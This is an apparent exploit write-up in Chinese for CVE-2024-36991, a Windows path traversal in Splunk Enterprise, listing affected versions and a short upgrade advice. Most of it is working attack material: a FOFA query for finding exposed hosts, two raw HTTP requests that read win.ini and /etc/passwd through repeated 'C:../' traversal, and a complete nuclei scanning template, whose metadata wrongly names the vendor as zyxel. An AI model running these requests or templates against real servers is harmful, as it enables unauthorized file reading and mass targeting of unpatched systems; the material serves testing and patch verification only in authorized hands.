## Splunk-Enterprise任意文件读取漏洞

Splunk Enterprise 是一款强大的数据分析软件，它允许用户从各种来源收集、索引和搜索机器生成的数据。2024年7月，官方发布安全通告，披露 CVE-2024-36991 Splunk Enterprise Windows平台 modules/messaging 目录遍历漏洞。漏洞仅影响 Windows平台上的 Splunk Enterprise，官方已发布安全更新，建议升级至最新版本。

## 影响范围

9.2.0 <= Splunk Enterprise < 9.2.2

9.1.0 <= Splunk Enterprise < 9.1.5

9.0.0 <= Splunk Enterprise < 9.0.10

## fofa

```
app="splunk-Enterprise"
```

## poc

```yaml
GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```yaml
GET /en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```

## **nuclei poc**

```yaml
id: CVE-2024-36991

info:
  name: Splunk Enterprise for Windows 任意文件读取漏洞
  author: fgz
  severity: high
  description: |
    Splunk Enterprise 是一款强大的数据分析软件，它允许用户从各种来源收集、索引和搜索机器生成的数据。2024年7月，官方发布安全通告，披露 CVE-2024-36991 Splunk Enterprise Windows平台 modules/messaging 目录遍历漏洞。漏洞仅影响 Windows平台上的 Splunk Enterprise，官方已发布安全更新，建议升级至最新版本。
  reference:
    - https://advisory.splunk.com/advisories/SVD-2024-0711
    - https://research.splunk.com/application/e7c2b064-524e-4d65-8002-efce808567aa
  classification:
    cvss-score: 7.1
    cve-id: CVE-2024-36991
  metadata:
    verified: true
    max-request: 1
    vendor: zyxel
    product: Splunk Enterprise
    fofa-query: app="splunk-Enterprise"
  tags: cve,cve2024,splunk-Enterpris

http:
  - raw:
      - |
        GET /en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../windows/win.ini HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains(body, '; for 16-bit app support')"
        condition: and
```

